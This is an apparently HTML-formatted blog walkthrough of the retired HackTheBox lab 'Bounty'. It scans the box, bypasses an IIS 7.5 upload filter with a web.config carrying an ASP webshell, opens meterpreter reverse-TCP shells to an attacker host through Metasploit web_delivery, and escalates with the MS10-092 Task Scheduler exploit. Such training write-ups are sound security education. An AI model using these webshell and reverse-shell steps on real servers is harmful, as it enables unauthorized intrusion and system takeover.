@@ -1,0 +1,107 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">HacktheBox Bounty Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-bounty-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-10-31T15:49:53+00:00">October 31, 2018</time><time class="updated" datetime="2025-07-05T14:53:22+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “Bounty”. It is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.</span></p>
+<p><span style="color: #000000;"><strong>Level</strong>: Medium</span></p>
+<p><span style="color: #000000;"><strong>Task: </strong>To find user.txt and root.txt file</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Open ports and Running services (Nmap)</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Web Directory enumeration (Dirbuster)</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploiting Vulnerability </strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing HTTP through IIS/7.5</span></li>
+<li><span style="color: #000000;">Generate RCE by uploading web.config</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Access victim’s shell</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Execute PowerShell one-liner in RCE (Metasploit)</span></li>
+<li><span style="color: #000000;">Get user.txt flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation  </strong></span></p>
+<ul>
+<li><span style="color: #000000;">Exploit kernel to get high privilege shell (Metasploit)</span></li>
+<li><span style="color: #000000;">Get root.txt flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Note:</strong> Since these labs are online available therefore they have a static IP. The IP of Bounty is 10.10.10.93</span></p>
+<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
+<h3><span style="color: #800000;">Scanning</span></h3>
+<p><span style="color: #000000;">Let’s start off with our basic nmap command to find out the open ports and services.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap –A 10.10.10.93</pre>
+<p><span style="color: #000000;">Things to be observers from its result are port 80 is open for HTTP and Microsoft-IIS/7.5 is service banner.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-4VRUwm_1qX8/W9nNI40NLKI/AAAAAAAAa8I/x3dCNM6bOpMnKUAEn-jYoqX0-082sJ8XACLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">Let’s navigate to port 80 through a web browser. By exploring IP in the URL box, it puts up following web page as shown in the below image.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NIbDoq5nDUM/W9nNJILGgDI/AAAAAAAAa8Q/dBl_CTRZGlstHEZQq3s8EWmGBxiKzfSvQCLcBGAs/s1600/2.png"/></span></p>
+<h3><span style="color: #800000;">Enumeration </span></h3>
+<p><span style="color: #000000;">Since we didn’t get any remarkable clue from the home page, therefore, we have opted Dirbuster tool for directory enumeration thus execute the following, here we had used <strong>directory-list-2.3-medium.txt </strong>directory for web directory enumeration.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-GoqMK6NzAt8/W9nNLKgPm7I/AAAAAAAAa8w/p2q4TbvEfxkETFFTrLuS6iJ3oIFcXuo3QCLcBGAs/s1600/3.1.png"/></span></p>
+<p><span style="color: #000000;"><strong>Hmm</strong><strong>!!</strong> Here I received HTTP response for <em>/transfer.aspx file </em>and <em>/upload</em>e<em>dFiles</em> directories.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-PBdDPqGbwag/W9nNLnKZU8I/AAAAAAAAa80/tOmh7vGJfo4b2LVmLh14UYyEdVhZmI_9gCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">When we have explored <strong>10.10.10.93/transfer.aspx</strong> in the browser and further welcomed by following web Page given below. The following web page lets you upload a file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ILb4XPDpNFY/W9nNLrIO1zI/AAAAAAAAa84/6GNWMT8EEfkzQFvNJRVNEMCXuACgMjTewCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">We try to have many attempts to upload a file but every time we get a message “Invalid File. Please try again”.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-yq51ewg4PDQ/W9nNL_x5N6I/AAAAAAAAa88/KWDXlwX9JbACMEnUST9ufuHTbC0TVOoRwCLcBGAs/s1600/5.png"/></span></p>
+<h3><span style="color: #800000;">Exploiting Vulnerability </span></h3>
+<p><span style="color: #000000;"> After so many efforts, I found this<span style="color: #3366ff;"> link</span> on googling “IIS 7.5 rce upload”. Here we read about the web.config file, which plays an important role in storing IIS7 (and higher) settings. It is very similar to a .htaccess file in Apache web server. Uploading a .htaccess file to bypass protections around the uploaded files is a known technique.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-69cNVgUDCkM/W9nNMJ7T_aI/AAAAAAAAa9A/ukXbuy4QvLs5FlT6EDBS7zyOG7qfjNU7ACLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">So with the help of above-given link, we create an asp file to run web.config which will respond by adding 1 and 2.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-VkZSib7zjjg/W9nNMGStHbI/AAAAAAAAa9E/Ba8WSHQicPcMGtC3ebJiy9cCe5hwZJm7ACLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">As you can observe, our web.config file is successfully uploaded inside /uploadedfiles/ directory.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FScqSG5AfN8/W9nNMV84LJI/AAAAAAAAa9I/GbfYzvDLAIY60cYNtG4x8kHE4qgkOurYACLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">So we have executed this file, it has given the expected response “3” which is the sum of 1 and 2. Hence now we can inject malicious code in this file which can create RCE vulnerability through it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-lWE55yEZOWk/W9nNMoyUbUI/AAAAAAAAa9M/PON0hu_oufQhngY2yZRg_zTkdkwELqOnQCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Luckily!! I found this link:  <span style="color: #3366ff;"><a style="color: #3366ff;" href="https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp">https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp</a> </span>link for ASP webshell. So I copied the whole content of asp webshell on our web.config file and upload it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8vhKMpVKWv0/W9nNIwPbgeI/AAAAAAAAa8M/pviogyKRZpU1qHqlSguvFF8Ptf1WmWB0ACLcBGAs/s1600/10.png"/></span></p>
+<h3><span style="color: #800000;">Access victim’s shell</span></h3>
+<p><span style="color: #000000;">On executing the updated web.config file, it creates a form where we can run the command as RCE. Once such surface you can run any malicious command to exploit RCE. Here we will be executing PowerShell code generated via the web delivery module of Metasploit.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf use exploit/multi/script/web_delivery
+msf exploit(multi/script/web_delivery) set srvhost 10.10.14.2
+msf exploit(multi/script/web_delivery) set target 2
+msf exploit(multi/script/web_delivery) set payload windows/x64/meterpreter/reverse_tcp
+msf exploit(multi/script/web_delivery) set lhost 10.10.14.2
+msf exploit(multi/script/web_delivery) run</pre>
+<p><span style="color: #000000;">Past the highlighted code given in the image Metasploit inside the text file and run this code to get a meterpreter session.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uKVMR4ffW8s/W9nNJarLKaI/AAAAAAAAa8U/bqtAqImokCwMaTB911QoN6mSHl7dEz0GQCLcBGAs/s1600/20.png"/></span></p>
+<p><span style="color: #000000;">Great!! We have successfully got the meterpreter session of the victim’s machine, now let’s find out the user.txt file to finish this task.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-lMJxrOSNrKU/W9nNJ60o_NI/AAAAAAAAa8Y/AnbOPietmrclmapPRRe2ObwdmEr0MpTtgCLcBGAs/s1600/21.png"/></span></p>
+<p><span style="color: #000000;">We successfully found the user.txt file inside <strong>/users/merlin/Desktop</strong>. Next, we need to find out the root.txt file to finish this challenge and as we know for that we need to escalated root privilege.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nlM0AMQLU0g/W9nNKG6yEzI/AAAAAAAAa8c/pDu1-m3LDn8T2B1AJ2oWI75yt8jGbraXwCLcBGAs/s1600/22.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">Then I run a post exploit “Multi Recon Local Exploit Suggester” that suggests local meterpreter exploits for further exploitation. The tool recommends exploits based on the architecture and platform of the user’s open shell, as well as the available exploits in meterpreter.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/multi/recon/local_exploit_suggester
+msf post(multi/recon/local_exploit_suggester) &gt; set session 1
+msf post(multi/recon/local_exploit_suggester) &gt; exploit</pre>
+<p><span style="color: #000000;"><strong>Wonderful!!</strong> Exploit Suggester truly proof itself by suggesting another exploit name to which target is vulnerable. So now we will go with the first option as highlighted in the image.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-K12-zpGiluE/W9nNKMzSaBI/AAAAAAAAa8g/r_H4UdcmN_gNWW9s2ClyMhWjOjEzg_F9gCLcBGAs/s1600/23.png"/></span></p>
+<p><span style="color: #000000;">This Vulnerability in Task Scheduler could allow elevation of privileges. This module has been tested on vulnerable builds of Windows Vista, Windows 7, Windows Server 2008 x64 and x86.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/local/ms10_092_schelevator
+msf post(windows/local/ms10_092_schelevator) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf post(windows/local/ms10_092_schelevator) &gt; set lhost  10.10.14.2
+msf post(windows/local/ms10_092_schelevator) &gt; set lport 5555
+msf post(windows/local/ms10_092_schelevator) &gt; set session 1
+msf post(windows/local/ms10_092_schelevator) &gt; exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-XXTydd2ae7k/W9nNKS7rfKI/AAAAAAAAa8k/TN_IfdjftXsFwoLAkXoU6cFyc53SF6ljgCLcBGAs/s1600/24.png"/></span></p>
+<p><span style="color: #000000;">Another Meterpreter session gets opened, once the selected exploit has been executed.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">getsystem
+getuid</pre>
+<p><span style="color: #000000;">As we can see that we are logged into the system as Windows privileged user <strong>NT AUTHORITY\SYSTEM</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-lHagUCv2O6U/W9nNK8q3s0I/AAAAAAAAa8o/qrKy-EcqcI0zx5MCuBUmMgOpv3kdK3zNgCLcBGAs/s1600/26.png"/></span></p>
+<p><span style="color: #000000;">Successfully we have found the the <strong>root.txt</strong> from the path: <strong>C:\Users\Administrator\Desktop</strong>.</span></p>
+<p><span style="color: #000000;"><strong>Wonderful!!</strong> We had completed both tasks and hacked this box.</span></p>
+<p><span style="color: #000000;"><strong>Happy Hacking!!!!</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-UU7S54CT01A/W9nNK9iWUeI/AAAAAAAAa8s/X8-6YZzLakAd96SAGZuafbhwx9ROAMAtwCLcBGAs/s1600/27.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
